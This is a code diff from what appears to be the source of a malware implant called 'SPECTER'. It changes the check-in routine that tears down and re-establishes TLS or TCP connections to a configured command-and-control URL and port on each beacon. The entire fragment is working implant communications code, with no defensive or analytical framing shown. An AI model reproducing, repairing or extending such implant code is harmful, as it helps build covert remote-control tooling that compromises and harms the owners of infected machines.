@@ -1071,10 +1071,12 @@ NTSTATUS comms_checkin(IMPLANT_CONTEXT *ctx) {
     CHANNEL_CONFIG *ch = &cfg->channels[comms->active_channel];
 
     /* Reconnect TCP for each checkin (HTTP/1.0 — server closes after response) */
-    if (comms->state >= COMMS_STATE_TLS_CONNECTED)
-        comms_tls_close(comms);
-    else if (comms->state >= COMMS_STATE_TCP_CONNECTED)
-        comms_tcp_close(comms);
+    if (comms->state != COMMS_STATE_DISCONNECTED) {
+        if (ch->needs_tls && comms->api.tls_available)
+            comms_tls_close(comms);  /* closes TLS + underlying TCP */
+        else
+            comms_tcp_close(comms);  /* plain TCP close */
+    }
 
     COMMS_TRACE("[SPECTER] checkin: tcp_connect...");
     NTSTATUS status = comms_tcp_connect(comms, ch->url, ch->port);
